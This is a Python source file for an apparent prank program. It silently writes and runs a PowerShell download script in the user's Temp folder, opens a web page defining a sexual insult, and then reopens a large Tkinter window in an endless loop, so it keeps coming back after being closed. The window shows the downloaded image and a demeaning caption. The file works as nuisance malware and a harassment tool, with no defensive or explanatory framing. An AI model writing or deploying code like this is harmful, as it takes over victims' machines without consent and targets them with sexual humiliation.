import tkinter as tk
import shutil
import os
from PIL import ImageTk, Image
import webbrowser

powershell_location = os.path.abspath("script.cmd")

powershell = r"powershell Invoke-Webrequest -URI https://i.redd.it/r958xxc0szx91.jpg -outFile %TEMP%\bottom.jpg"
file = open("script.cmd", "w")
file.write(powershell)
file.close()
shutil.move(rf"{powershell_location}", rf"C:\Users\{os.getlogin()}\AppData\Local\Temp\script.cmd")
os.system(rf"C:\Users\{os.getlogin()}\AppData\Local\Temp\script.cmd")

webbrowser.open(rf'https://www.urbandictionary.com/define.php?term=submissive%20bottom')

while True:
    window = tk.Tk()
    window.geometry("1700x950")
    bottom = tk.Label(text="Little Bottom Boy", font=("Arial", 100))
    frame = tk.Frame(width=400, height=400)
    frame.pack()
    frame.place(anchor='sw', relx=0.3, rely=1.075) 
    img = ImageTk.PhotoImage(Image.open(rf"C:\Users\{os.getlogin()}\AppData\Local\Temp\bottom.jpg"))
    label = tk.Label(frame, image = img)
    label.pack()
    bottom.pack()
    window.mainloop()


